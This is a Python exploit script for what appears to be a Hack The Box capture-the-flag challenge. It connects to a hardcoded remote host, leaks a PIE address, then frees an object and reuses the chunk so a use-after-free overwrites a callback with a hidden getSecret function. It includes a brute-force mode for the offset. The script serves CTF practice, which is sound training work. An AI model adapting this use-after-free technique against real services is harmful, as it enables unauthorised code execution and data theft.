#!/usr/bin/env python3
import re
import socket
import struct
import sys
import time


HOST = "154.57.164.65"
PORT = 30105
ACCESS_CODE = b"D3f1n3tlya71c74c703gam3"

# The hosted second-stage binary prints generateUserID; its hidden getSecret
# callback is 0x1a0 bytes before that leak.
GETSECRET_DELTA = 0x1A0


def recv_until(sock, marker, timeout=8):
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(
                f"connection closed while waiting for {marker!r}; got {bytes(data)!r}"
            )
        data.extend(chunk)
    return bytes(data)


def attempt(relative_target, verbose=True):
    with socket.create_connection((HOST, PORT), timeout=8) as sock:
        recv_until(sock, b"column (0-4):")

        moves = (
            b"0 0\n", b"0 4\n", b"1 1\n", b"1 3\n", b"2 2\n",
            b"3 1\n", b"3 3\n", b"4 0\n", b"4 4\n",
        )
        for move in moves:
            sock.sendall(move)
            if move != moves[-1]:
                recv_until(sock, b"column (0-4):")

        recv_until(sock, b"Enter Username:")
        sock.sendall(b"agent\n")
        recv_until(sock, b"Enter Access Code:")
        sock.sendall(ACCESS_CODE + b"\n")
        recv_until(sock, b"> ")

        # Leak the PIE address of generateUserID.
        sock.sendall(b"H\n")
        leak_output = recv_until(sock, b"> ")
        match = re.search(rb"User ID: (0x[0-9a-fA-F]+)", leak_output)
        if not match:
            raise RuntimeError("failed to obtain the PIE leak")
        generate_user_id = int(match.group(1), 16)
        get_secret = generate_user_id + relative_target
        if verbose:
            print(f"[+] generateUserID: {generate_user_id:#x}")
            print(f"[+] target:         {get_secret:#x}")

        # Free the global Agent, leaving a dangling pointer behind.
        sock.sendall(b"E\n")
        recv_until(sock, b"(Y/N)?")
        sock.sendall(b"Y\n")
        recv_until(sock, b"> ")

        # Hackupdate malloc(8) reuses the freed Agent chunk. Its raw read lets
        # us replace the first field (the callback) with getSecret.
        sock.sendall(b"F\n")
        recv_until(sock, b"previous hack go?")
        sock.sendall(struct.pack("<Q", get_secret))

        sock.settimeout(0.35)
        output = bytearray()
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            output.extend(chunk)
            if b"HTB{" in output:
                break

        flag = re.search(rb"HTB\{[^}]+\}", output)
        return flag.group().decode() if flag else None


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--brute":
        # The hosted C2 build is slightly different from the embedded copy.
        # Its getSecret-to-generateUserID distance is in this narrow interval.
        for delta in range(0x195, 0x1D2):
            if delta % 8 == 5:
                print(f"[*] testing callback delta {delta:#x}", flush=True)
            try:
                flag = attempt(-delta, verbose=False)
            except (EOFError, OSError, TimeoutError):
                continue
            if flag:
                print(f"[+] remote getSecret delta: {delta:#x}")
                print(f"[+] Flag: {flag}")
                return
        raise RuntimeError("getSecret was not found in the expected interval")

    relative_target = int(sys.argv[1], 0) if len(sys.argv) > 1 else -GETSECRET_DELTA
    flag = attempt(relative_target)
    if not flag:
        raise RuntimeError("exploit ran but no flag was returned")
    print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
